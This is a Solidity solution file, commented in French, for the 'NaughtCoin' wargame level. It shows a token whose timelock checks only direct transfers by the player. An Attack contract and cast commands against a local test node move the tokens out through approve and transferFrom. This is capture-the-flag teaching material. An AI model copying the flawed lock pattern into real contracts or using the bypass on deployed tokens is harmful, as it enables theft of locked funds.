// NaughtCoin est un jeton ERC20 et vous les détenez déjà tous.
// Le problème est que vous ne pourrez les transférer qu'après
// une période de blocage de 10 ans. Pouvez-vous trouver comment
//  les faire sortir vers une autre adresse afin de pouvoir les
//  transférer librement ? Terminez ce niveau en mettant votre solde de jetons à 0.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(
        address _to,
        uint256 _value
    ) public override lockTokens returns (bool) {
        //La faille ici est que le modifier lockTokens a un else
        //et je peux d'abord utiliser la fonction approve pour permettre à une autre adresse
        //de depenser les tokens au nom du player.
        //C'est que je fais avec le contract Attack qui ou j'utilise la fonction transferFrom
        //pour permettre à ce que à partir d'une des instances du contract Attack je permet qu'il
        //depense les fonds en mon nom puis il utilise la fonction transferFrom pour s'envoyer lui
        //même les fonds puis les transférer sur un autre compte

        super.transfer(_to, _value);
    }

    //Je peux utiliser cast pour hacker le système
    //Je deplois le contract Attack avec l'adresse du contract NaughtCoin depolyé sur le réseau
    //Je permets d'abord que l'instance du contract Attack puisse transferer les tokens en mon nom
    // en faisant
    //cast send $n "approve(address,uint256)" $a 1000000000000000000000000 --rpc-url 127.0.0.1:8545 --account anvil
    //Ensuite j'utilise la fonction attack dans laquelle j'utilise la fonction tranferFrom
    //pour envoyer ces fonds de mon adresse vers celle du contract en faisant
    //cast send $a "attack(address,uint256)" 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 1000000000000000000000000 --rpc-url 127.0.0.1:8545 --account anvil
    //Enfin je peux envoyer ces fonds vers une autre adresse grace a la fonction withdraw de Attack
    //cast send $a "withdraw(address)" 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 --rpc-url 127.0.0.1:8545 --account anvil
    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

contract Attack {
    NaughtCoin ng;

    constructor(address _ng) {
        ng = NaughtCoin(_ng);
    }

    function attack(address user, uint256 _value) public {
        ng.transferFrom(user, address(this), _value);
    }

    function withdraw(address receiver) public {
        ng.transfer(receiver, ng.balanceOf(address(this)));
    }
}
